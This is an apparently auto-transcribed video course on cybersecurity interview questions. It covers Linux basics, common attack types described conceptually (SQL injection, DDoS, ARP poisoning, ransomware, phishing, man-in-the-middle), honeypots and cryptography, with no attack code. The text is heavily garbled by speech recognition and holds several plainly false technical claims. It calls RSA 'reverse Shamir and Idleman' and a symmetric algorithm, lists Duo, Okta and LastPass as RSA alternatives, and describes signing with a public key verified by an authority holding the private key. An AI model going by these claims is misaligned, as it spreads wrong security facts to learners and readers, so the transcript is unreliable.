discussed it's the memory module itself
you can access only the physical address
on that particular memory because
logical addresses can be viewed but you
cannot access them physically uh
generation uh The Logical addresses are
generated by the CPU during the
processing time whereas physical
addresses are generated are computed by
the memory management unit or the mmu
that you have on your computers
and as far as logical addresses they
will always be they are variable whereas
the physical address is always going to
be constant looking at the next question
what is the difference between logical
address space and physical address space
so moving on from the previous question
to this
The Logical address is
address created by the CPU for the
processes that need to be addressed and
that need to be stored as a buffer in
the physical memory whereas the physical
memory itself is going to be a address
that is going to be there on the
physical part of that memory which is uh
which is going to be assigned to it by
the mmu then the next question discusses
uh shells so what shells are used in
Linux now what is the Shell Shell is the
command line interface that we utilize
on our landex machine so the terminal
window as we call it is a shell and
there are different variations of a
shell based on what Linus operating
systems you are using the desktop
operating systems that you use uh or the
server operating systems and real in
today's world that you're going to use
normally you will always have a bash
shell which is the first shell that you
see on the screen known as a bone again
shell it is a default for Linux
distribution so as far as end consumers
regular consumers are concerned it is
always going to be a bash shell a bone
again shell that you're going to utilize
for scripting and to execute regular
commands but when it comes to high level
programming or it comes to
specialization tasks then you got the
rest of these uh shells that you can
utilize for example the ksh known as a
conch shell is used for high level
programming
which supports associative arrays and
built-in operations the CSH or the C
shell
has different functionality like
spelling Corrections and drop controls
the zsh or the Z shell
provides unique features like file
generation startup files and fish
friendly interactive shell which
provides features like Auto suggestions
and configuration so all of these have
different functionalities depending on
what usage that you have for that
particular shell the most common shell
like yesterday did is the bash shell
that you'll always come across in your
desktop Linus operating systems then
looking at the next question what are
the process States in Linux now what is
a process process is basically a service
that is running
for a particular application for that
application to function right this
process is going to direct user input to
the processor process it get that output
back to the application execute it and
then show it onto the graphical user
interface for the user so in Linux there
are five states for a process first is
the ready space now in ready in this
state the process is created and it is
ready to run so it is waiting uh it is
waiting for input it's ready uh the
application is executed the running is
when the process is being executed
itself blocked or weight is when user
input is being looked upon so it's
waiting for user input so that it can do
the processing completed or terminated
it has completed its execution or was
terminated by the operating system for
some reason or the other so this is when
things have uh the processing has been
completed
and then lasted state is zombie where
the process is terminated but the
process table still holds the
information maybe it is waiting for the
kill request before it gets terminated
so these are the five states for a Linux
process to be in and that brings us to
the 10 questions in the operating system
and application space in the next video
we'll be looking at 10 more questions on
cyber attacks interview questions based
on cyber attacks
let's start off with the first one the
first question is what is SQL injection
SQL stands for structured query language
which is a language that is used by most
of your databases or your relational
databases uh the the variations of your
database would be MySQL Microsoft SQL
Oracle SQL
you'll have IBM databases all of these
databases utilize the structured query
languages to interact with the
applications now all of these databases
have their own syntax so you'll have to
study most of these databases based on
which applications and which databases
you want to provide security for
but as the name suggests SQL injection
vulnerability or a structured query
language injection vulnerability is
where a user can maliciously inject a
SQL input
or a SQL statement in a query and
send it to the database and evoke a
response response out of it
so this vulnerability is not
specifically to the database it uh the
vulnerability lies more in the
application and the coding of that
application so when the application
receives a query which it needs to be
forwarded to the SQL database we need to
configure at the application Level of
what queries are allowed and what
queries are not allowed so there are
different various aspects
of how to manage a SQL injection
vulnerability but the basic flaw lies in
the application where uh invalidated
input is accepted and sent forward to
the database where the database might
confuse it into an executable statement
and thus create a response that was not
warranted there are various types of SQL
injections as shown on the screen in
band secret injection where you can look
at an error based or a union based
injection a blind SQL injection where it
is either Boolean based or a time-based
attack and then an out of bound SQL
injection
essentially you're looking at databases
and you're looking at application
security however you want to encourage
secure coding practices so in
unvalidated input is mitigated
the next question is what is spoofing
now in spoofing you're basically
assuming the identity of another person
so here the attacker pretends to be some
other person or an organization and
sends you an email that appears to be a
legitimate email it looks almost genuine
it has been constructed to replicate
what a genuine email would have been and
it is very difficult to spot a fake one
there are different ways to identify
whether an email is genuine or not but
that's for a different video moving on
to the next question what is a
distributed denial of service attack or
a DDOS attack now generally a denial of
service attack is an attack where
legitimate users are prevented access to
the resources that they legitimately can
access right so for example if it is a
bandwidth based attack the attacker
consumes the bandwidth of the network in
such a way that there is no more
bandwidth left for legitimate users to
access the network
now a single device may not be able to
generate that much amount of traffic to
consume the bandwidth of a huge server
thus the attacker will construct a
botnet and through that botnet they will
launch a distributed denial of service
attack
to the Target victim right so a botnet
there are two terms that you want to
look at over here the first term is a
bot and the second one being the botnet
itself bot is a software that once
installed on a victims machine allows
the hacker to send remote commands to
that machine that will make it to
generate some activity
once we have enough machines on which
such Bots have been implemented the
collection of these machines would be
known as a botnet so an attacker would
then instruct this entire botnet to
start generating data traffic to be to
be sent to the targeted Network or to
the targeted server which will then bog
down the server thus crashing it and
preventing users from accessing that
particular Source the next question is
how to avoid ARP poisoning or ARP now
first let's understand what ARP is ARP
stands for address resolution protocol
which is a protocol used by computers to
communicate over the network once you
compute a boot drop
it starts a discovery process of
identifying its neighbors so if I'm in a
particular subnet my machine will
proactively send out ARP requests and
address resolution protocol to find out
which other machines are within the same
network and which are live once it sends
out a query a live machine will respond
to that query along with its Mac address
this information is dense stored in what
is known as a ARP table or an ARP table
on the machine's cache
so whenever my machine now wants to send
out a packet to this particular machine
it will go to the ARP table it will
identify the IP address and the
associated Mac address it will print
that onto the data packet as a
destination uh IP and destination Mac
and Center packet across the switch the
switch will then identify the MAC
address and send the packet to the
relevant machine that is connected to
that particular switch
now to confuse this switch into sending
it to a different machine so our
poisoning attack is created this attack
is generally launched to
create a man in the middle attack now to
prevent this Arc poisoning from
happening in the first place there are
three different aspects that we can
utilize first we can use packet
filtering which will filter filter out
and block packets that are the same
Source address data so you have
identified some malicious IP addresses
and you want to block out some IP
addresses so you're using a packet
filter firewall where you have
constructed the firewall to filter out
certain packets
originating from particular range of IP
addresses this firewall and this
technique will then block those kind of
packets coming in
second keeping away from trust
relationships organizations will develop
protocols that do not depend on trust
relationships and thus you want to keep
this protocol away from there once you
have created a trust relationship
these machines should not be sending out
ARP requests to other machines in the
first place since the trust relation has
been has been defined and these machines
know whom to communicate with such kind
of protocols should then be disabled
or you can use Erp spoofing software so
there are some there are softwares out
there that will look for ARP spoofing
and prevent that from happening in the
first place so if somebody has sent out
a spoofed ARP packet that packet will be
picked up by this software and it will
be mitigated of network visualizers like
glass wire antiviruses like so force uh
they have inbuilt capabilities of
identifying uh our spoofing attacks and
mitigate them in the first place in the
next question we are going to discuss
what is ransomware
now ransomware is a type of malware that
blocks victims to access personal files
and demands Ransom to regain access
there are three categories before we go
into the categories let's just revisit
what ransomware is let's start with the
word malware malware is a malicious
software that poses as a legitimate
software but has a payload that will
have a security impact on your machine
so in this instance viruses Trojans all
of these can be classified under
Maldives so can Ransom which a Trojan is
a software that will give you a backdoor
access to a to a particular device a
virus will do some destructive activity
on that device a ransomware will
basically encrypt the data of that
particular user from on that particular
machine thus rendering that my that data
inaccessible to the users themselves
and in turn will demand Ransom to
provide access to that particular data
so the three types of ransomware's the
first one is square wear which uses
social social engineering to cause
anxiety or the perception of a threat to
manipulate users into buying unwanted
software so this preys on the
gullibility of humans
where you can see a pop-up appearing on
your screen which can scare you into
believing that you may have been
attacked or there is a virus on your
machine and then instructs you to
download a particular software to
mitigate that particular virus now
the malware will be in this software
that you will be downloading and then a
ransomware will be installed and your
data will be encrypted screen lockers
where login uses computers by preventing
them from logging in and displaying an
official looking message you will see a
screen saver once you boot up which
prevents you from accessing the login
page so it will not allow you to log
into your own machine but it will give
you a warning that your data has been
encrypted and you need to connect to a
particular email address and send bit to
send Bitcoins over there to get a
decryption key to access your own data
and then the encrypting ransomware
displays a message demanding payment in
return for the private asymmetry key
which is needed to dedicate the
symmetric keys for encrypted file so
once your files have been encrypted you
might just have a blank screen in front
of you where you'll receive a warning
message where it instructs you to pay up
a ransom in Bitcoins or in some
cryptocurrency to some particular
digital e-wallet which is not traceable
and once you make that payment they will
send you the decryption key and then you
can access your data if getting your
learning started is half the battle what
if you could do that for free visit
skillup by simply learn click on the
link in the description to know more
then talking about the next question
what is the difference between an active
and a passive Cyber attack now when we
talk about cyber attacks Cyber attack is
a activity that is caused by a malicious
user who wants to try to get access or
do some security incidents
on the victim's devices so there are two
ways that can happen it's either in an
active manner or a passive manner in an
active manner the Intruder attempts to
disrupt a Network's normalcy modifies
data and tries to alter the system's
resources so this is more active where
the attacker will proactively try to
destroy the network so that
Communications fail or they might try to
modify the data where uh we're using a
ransom where they can encrypt it or they
might delete that data using a virus or
steal the data using and Trojan or they
might even alter the data so that it is
no longer trustworthy whereas in a
passive attack the Intruder intercepts
data traveling through a network here
the into the eavesdrop but does not
modify the message so they're just
listening in they're just observing what
is going on they are not manipulating
the data they are not stealing anything
it's just that they are monitoring the
activity that's going on then the next
question what is a social engineering
attack now social engineering attack is
a people-based attack the victim here is
the Human by itself the vulnerability
also lies in the human it may be
executed through a computer but end of
the difficult abilities of the human so
it is the art of manipulating people so
that they end up giving up confidential
information
now we always read in the papers where
somebody got manipulated their passwords
got hacked and somebody's life savings
got wiped out right because they said
the OTP with someone or they shared of
the password with someone now creating a
scenario where these people will fall
prey to this attack and share this kind
of personal information to unknown
people that is where the social
engineering attack comes in
creating that scenario which will ensure
that these people give out this
confidential information now there are
three categories in this attack the
first one is a phishing attack second is
a sphere phishing attack and a third is
a railing attack now phishing attack is
basically a generic attack
it is targeted To The World At Large
whoever Falls prey to that attack will
be a victim
whereas a spear phishing attack is a
targeted attack towards a specific
individual or a group of individuals or
towards an organization so there is a
lot more research that goes into
spearfishing where you analyze the
victim you try to figure out what their
vermilities are and your tailor make or
you customize the attack
to that particular vulnerability now
once you have that attack you launch it
against those people those people
will then fall prey to this attack and a
wailing attack is where you're attacking
uh top level Executives so the sea level
Executives of an organization
politicians movie stars wealthy and
powerful people so any of these people
when they're attacked it will be known
as a wailing attack
next question what is man in the middle
attack now this is something that we are
touched base when we talked about ARP
where the ARP poisoning attack needs to
be executed to leverage a man in the
middle attack now in the man in the
middle attack the attacker attacking
computer takes the IP address of the
client unaware of this the server
continues to communicate with the
attacker now if you remember in a
previous question we have also talked
about spoofing so in this scenario uh
attacker has spoofed their IP address to
replicate themselves as a genuine client
and now with that spoofing in mind they
might either throw our poisoning attack
or just because of the spoofed IP
address become a man in the middle that
means that they are now eavesdropping on
the conversation between the actual
client and the server by imposing
themselves as a server in this scenario
the attacker is now a go between between
the client and the server and can
eavesdrop and can copy the data if they
want they can modify the data as well so
as you can see on the screen the
attacker becomes man in the middle which
means that they are now eavesdropping on
the conversation that is happening
between the client and the server the
next question
who are blackout hackers and Whitehead
hackers the main thing is the
differentiation between a blackhead
hacker and a wildcat hacker now a
blackhead hackers are skilled
individuals
who illegally hack into a system the
motive behind such an attack is mostly
for monetary gain these individuals are
known also known as security crackers
now if you look at your criminal hackers
those who have malicious intent those
who do hacking for the intent of
personal gain or for the matter of
disruption the main thing that black hat
hackers lack
is authorization they are not authorized
to do the activity that they are about
to do and they are going to get
unauthorized access to devices or to
data which is going to cause losses to
the organization involved
whereas on the other side a white ad
hacker are also known as ethical hackers
these are the individuals who discover
vulnerabilities in a computer network
and they help the organizations mitigate
these vulnerabilities they help the
organizations defend themselves from
black hat hackers so the main difference
between these two types of hackers a
black hat and a white hat is the intent
and the authorization so black hat
hackers will have malicious intent they
will try to personally gain from that
attack
from by finding your vulnerabilities
they also will not have authorization to
conduct whatever activity they are doing
whereas on the other side Whitehead
hackers will be hired by organizations
they will provide authorization for
certain activity that the Whitehead
hacker can do to find out those
vulnerabilities once those
vulnerabilities have been found out by
the white hat hacker they will report it
to the management and guide them in
implementing security controls to
mitigate those vulnerabilities the main
difference between a blackhead and a
white hat is the authorization and the
intent the next question what are
honeypots
now honeypots are a very interesting
device that can be introduced in a
network uh these basically are decoy
servers that are implemented in a
network to attract the attention of
attacker
it is there to lure an attacker uh into
uh attacking that particular device thus
creating a security blanket blanket for
the rest of the devices
so if an attacker has been able to
bypass a firewall and is now trying to
scan a particular Network when they Scan
they will come across various devices
that are there in the network they will
then proceed to do a vulnerability scan
on these devices the Honeypot at that
point in time will provide as an approve
as an attraction to these attackers
because it will
demonstrate some vulnerabilities to the
hacker which will divert their attention
so these vulnerabilities are simulated
on these devices these actually do not
exist but the moment the attacker then
starts interacting with the Honeypot the
Honeypot will identify that as a
malicious traffic and will warm the warn
the administrator about a possible
attack that is going on the
administrator will then investigate
through the Honeypot of what activities
going on and then reconfigure the
security controls to block the attacker
or mitigate the attack itself right so
it is more of a decoy server that will
showcase or simulate some
vulnerabilities to an attacker thus to
lure them and Safeguard the rest of the
network these are the 10 questions for
cyber security in the next video we will
be talking about cryptography the first
question Define cryptography encryption
and decryption now cryptography is used
by Security Professionals to scramble
data
into non-readable format which is used
in securing that information
so it involves converting data from a
readable format into a non-readable
format and then reversing it back to
readable format again
for example the word computer is now
scrambled into looking like an
unreadable format now if you look at
this word that it has been scrambled
into it would be very difficult
for a human to figure out
what the actual world was now in this
scenario we have taken an algorithm
where we have made a shift of the
alphabet where we have added two
alphabets the current one so C plus 2
becomes e
o plus 2 becomes q m plus 2 becomes o so
we have done a shift of 2 and thus the
key over here for this algorithm is the
alphabet plus two so any person who
figures that out will be able to
unscramble this and convert this back
into readable text the fact of
scrambling a readable text Data into
something that is unreadable by using a
particular key is What cryptography is
all about
now as we discussed the decryption again
is replacing the alphabet and taking it
further back by two characters so e
minus two becomes c q minus 2 becomes o
o minus 2 becomes M and so on so forth
so anybody who knows this key uh the
shift key
anybody will able to decrypt this
particular character so this depends on
the user if I want to utilize alphabet
plus five then the spacing the shifting
of that character will be the fifth
character from that particular character
and so on so forth
the next question what is the difference
between ciphertext and clear text
ciphertext refers to the text which is
encrypted and totally undesirable
the message received after decryption is
known as clear text this text is
comprehensible so the word computer is
clear text that means that it has not
been treated to any cryptographic
measures it does what it is intended to
be however if the moment we encrypt it
that means we scramble it into
unreadable text by using any of the
algorithms that we'll be looking at
that text is known as a cipher text
and without the key this becomes
unreadable
the clear text as discussed is the plain
word that we have utilized we are using
the English language in this instance so
the plain word computer is the clear
text once we add the encryption layer to
it
we get the cipher text to it
moving on to the next question what is a
block Cipher
this refers to the method of encrypting
the plain message block by block the
plane message is broken down into fixed
size blocks and then encrypted now a
block Cipher is normally used for data
that is stored so a data that is stored
on a hard disk and we want to encrypt
that data that is known as block
encryption or a block Cipher so block
Cipher is an algorithm that will allow
you to encrypt data that is stored onto
a hard disk so in this example we've got
plain text which is 64 bits in size and
we have added a layer of encryption to
it so plain text plus the key that we've
studied in the previous questions and
then The Scrambled data out of it which
is unreadable and thus encrypted then
the next question what is public key
infrastructure now the public key
infrastructure is a set of policies
which secures the communication between
a server and a client it uses two
cryptographic keys public and private so
the infrastructure itself is a set of
policies people procedures and
techniques which are standardized in
nature and are globally accepted which
allow us to use digital certificates to
encrypt data and decrypt the data at the
other end we use a symmetric encryption
over here which means that we are used
two keys one is a public key to encrypt
and the private key to decrypt
the other part of your encryption is a
symmetric encryption where the same key
is used to encrypt and the same key is
used to decrypt
now in a public key infrastructure
like I said we have standardized that so
in the standardizing part of it these
are the various players that have been
defined in the public key infrastructure
the first is this user or the sender in
the scenario the one who requires this
digital signature to directly sign a
particular transaction or a
communication a registration Authority
with whom they are going to register for
that particular key the certification
Authority who issues that key the
verification Authority who validates the
key itself and the recipient who is
going to be the other party of that
particular transaction so how is this
utilized
a sender or the user who requires this
digital signature will request or apply
for a digital signature with the
registration Authority the registration
Authority would validate the genuine of
the user so they might do some identity
verification or uh proof of residence or
something like that once they've
identified the person and they have
validated the information they will then
send the request to the certification
Authority stating that the sender has
been validated and we can and the
certification Authority can issue the
digital certificate to the particular
user
they will send the public key to the
sender which will be utilized by the
sender for further transactions so when
the sender is going to sign some data
and uh wants to send it across to the
recipe and they will use the public key
to sign it and send it across the
recipient will then validate with the
verification authority to see if the
data the signed data is correct or not
now why
the certification Authority sends the
public key to the sender the
certification Authority updates the
private key with the verification
Authority so whatever is signed by the
sender received by the recipient and
they want to validate it they will send
it back to the verification Authority
the verification Authority will validate
using the private key once the private
key is validated
it will then send the OK signal back to
the recipient thus allowing the
validation of that particular
transaction
if the signature is tampered with or is
not the very fiction Authority is not
able to validate the signature it will
then send a denial message back to the
recipient and the transaction will not
go through so the PK enables trusted
digital identities for people so the pki
grants secure access to digital
resources based on the infrastructure
that has been created and the core of
the pki is a certification Authority
which ensures that the trustworthiness
of the Digital Data is
ensured so going back to the previous
slide
these are the key players that have been
standardized in the public key
infrastructure the certification
Authority is the authority that issues
the digital certificates the validation
Authority is the one who validates that
digital certificate moving on what is
RSA
RSA is one of the first public key
crypto systems that is used for secure
data transmission it stands for reverse
Shamir and Idleman now these are the
three people who have created this
algorithm rather West ADI Shamir and
Leonard Edelman who are the inventors of
this technique it is a symmetric
cryptography algorithm which works on
both public and private Keys hence the
encryption key is public and the
decryption key is kept private now as we
have discussed earlier symmetric and
asymmetric cryptography symmetric
cryptography is where the same key is
used to encrypt and decrypt whereas a
symmetric cryptography is where there
are two keys to encrypt and decrypt the
algorithm what are the few alternatives
to RSA now RSA is an algorithm that is
used for encryption there are a lot of
other algorithms that can be utilized to
alter or do scramble data depending on
your requirements so in the previous
question we have studied and we have
talked about what RSA is it stands for
uh
three creators of that particular
algorithm but there are a lot of
alternatives to this algorithm depending
on how secure you want that data to be
and some of them are listed here on your
screen Duo security OCTA Google
Authenticator and last cost LastPass is
a password manager
so is dual security Google authenticate
is something that we all utilize it as
an application that you can download and
store on our mobile devices and we can
set that up to authenticate ourselves
with certain portals so it issues a
unique ID to us which once utilized will
allow us access to those particular
portals OCTA is an identity manager
where you have you have created
different digital identities and you
have assigned them certain permissions
and based on your authentication
mechanisms OCTA will allow or disallow
access to those different applications
or different portals as you have
configured it so all four
or authorization authentication
mechanisms which can be used as
alternatives to RSA if getting your
learning started is half the battle what
if you could do that for free visit
scale up by simply learn click on the
link in the description to know more
next question what are the prime
objectives of modern cryptography and
this is a very important question
because we've we've so far looked at
what cryptography is and what public key
infrastructure is but what is the
achievement out of it why are we
utilizing it and what do we want to gain
out of it so the mean and the prime
objectives of modern cryptography are as
follows uh mentioned on your screen the
first one is confidentiality the second
one is non-repudiation
third one is authenticity and the fourth
one is integrity now if I go back to the
first one confidentiality uh that is
where I want to keep data confidential
that means it will only be visible to
the authorized users right so here I
have created a list of people who have
deemed as authorized users and have
created a digital identity to them and
have given access controls to those
people now that is how confidentiality
is insured so when we want to keep data
confidential we create a list of users
who we are going to allow access to
certain resources and we are going to
Define what access controls are to be
utilized what access are allowed whether
they've got an administrative access or
user level access and only those
authorized users are going to be able to
access these resources that is how we
maintain confidentiality
the next one is non-repudiation
non-reputation is the prevention of
denial of having being a part of that
particular transaction so in the public
key infrastructure that we discussed
where a digital signature was utilized
to sign a particular transaction and
then sent to the recipient the sender
would not be able to deny of having
originated the transaction because it
was using their
digital certificate thus non-reputation
comes in the picture uh one more example
that we can have here is on our mobile
phones when we use SMS short messaging
service and we send a message to uh to
another person the person when they
receive a message the number is
validated by the service operator
and thus the sender cannot deny having
sent that message the sender at the same
time can have a delivery report sent to
them from that the message was delivered
to the inbox of the recipient and thus
if the recipient denies having received
that message that delivery report
becomes proof of having that message
being delivered to their inbox thus both
the parties cannot deny of have a of
being a part of that particular
transaction
then comes the part of authenticity
now in confidentiality we have created a
digital identity assigned it to a
particular person
and we have given them digital
signatures where they cannot deny having
being a part of that transaction but
authenticity is the part where they try
to prove that they are who they claim to
be so if I am claiming a digital
identity
I have to prove that I am that person
who I'm Who I'm trying to claim to be
and an example to that is when we go to
our gmail.com websites it first asks us
what is our username our username is
normally our email address which
identifies the account that we are
trying to access right so this account
is confidential because it is only
authorized for a particular person
and once they identify themselves by
identifying the email address that's
when the authentication part comes into
the picture where it asks for the
password
now it has never ever happened that we
just go on to gmail.com type in a
password and then it figures out which
account we are talking about so the
first step is always called the
confidentiality part where we identify
which account we are talking about and
then we try to authenticate as the owner
of that particular account by providing
the appropriate password to that account
if both of these match only then do we
get access to that account and we are
able to make uh whatever transactions we
want to make now when we are making
those transactions non-repidation comes
into the place where all our activities
also being logged so we have identified
our account we have authenticated
ourselves by providing the password so
the proof is there that it is us who are
trying to access it and then whatever
activity we do send an email receive an
email delete something attach something
all of those activities are logged and
stored as proof of what actions have
been done so tomorrow if we deny having
sent that email gmail can still prove to
us through those logs that though that
that activity was done by us
and the fourth part is integrity which
ensures that the data received and sent
and sent by the sender and received by
the recipient has not been modified
while in motion
so the Integrity part is the
trustworthiness of that data that the
data has not been modified by any hacker
or any other entity and is still
trustworthy so these are the four Prime
objectives of modern cryptography once I
have scrambled that data
using
my Public's signature it is only my
private signature that is going to
decrypt it right
using these mechanisms I will be able to
achieve all these four aspects of
cryptography and security next question
what is safer now c4 stands for secure
and fast encryption routine which is
also a block Cipher as we have discussed
previously block Cipher is a cipher that
is used to encrypt data that is stored
so it has a 64-bit block size and byte
oriented algorithm
uh safer's encryption and decryption
procedures are highly secure this
technology is widely used in
applications like digital payment cards
so when you are using uh
a digital payment gateway to make
transactions so you have we have gone on
to an online portal you want to purchase
a particular item and then it takes you
to another
payment Gateway where you have to fill
in your credit card information
sensitive information like your uh
expiry dates CVV information and then
the OTP or the password that you have
created for your particular account now
all of these need to be secured or
highly secured based on PCI DSS which is
the payment card industry data security
standard so these standards ensure that
certain Protocols are utilized to attain
that level of security safer is one of
those block ciphers that is used under
the digital payment Gateway
infrastructure next question how does
the public infrastructure public key
infrastructure work
now we have already discussed this in
the previous diagrams we have identified
the key players the certification
Authority the registration Authority the
end user who requires the digital
certificate the validation Authority
who's going to validate it and then the
recipe and the end user with whom the
transaction is going to be uh conducted
so the first point here is the request
for the digital certificate is set to
the registration Authority they validate
it and then they okay to the
certification Authority who then process
the request and the digital certificate
is issued to the person who has
requested it so when the person wants to
conduct that transaction they use that
digital certificate to sign that
transaction with the end user the end
user validates that with the validation
Authority and once validated the
transaction goes through and now the
last question what is the Blowfish
algorithm it is a 64-bit symmetric
encryption algorithm so this is an
algorithm that uses the same key
to encrypt and the same key to decrypt
the same secret Keys used to encrypt
indicate the messages here the
operations are based on exclusive ORS
and additions to on 32-bit words the key
has a maximum length of 448 bits now
this is a little bit technical uh you
might not want to go this technical in
an uh in an interview question you just
need to identify what the algorithm is
used for so whether it is a symmetric
algorithm which means it uses the same
key or a symmetric algorithm where it
uses a public key to encrypt and a
private key to decrypt or does the
Blowfish algorithm is just one more
algorithm which uses symmetric
encryption to encrypt and decrypt data
algorithms that we have seen RSA and
others that we have discussed as well as
the interview questions are concerned
what we need to remember is which
algorithms are symmetric which
algorithms are asymmetric what do
symmetric algorithms do and what do
unsymmetric uh symmetric algorithms do
and we also look at block ciphers and
stream ciphers block size refers are
utilized to encrypt data that is stored
stationary data retype rest and stream
ciphers are utilized for data in motion
while they are being streamed
and with that we have come to come to
the end of this video on cyber security
full course I hope it was informative
and interesting if you have any
questions related to the topics that
were covered in this video please ask
away in the comment section below our
team will help you solve your queries
thanks for watching stay safe and keep
learning
hi there if you like this video
subscribe to the simply learned YouTube
channel and click here to watch similar
videos turn it up and get certified
click here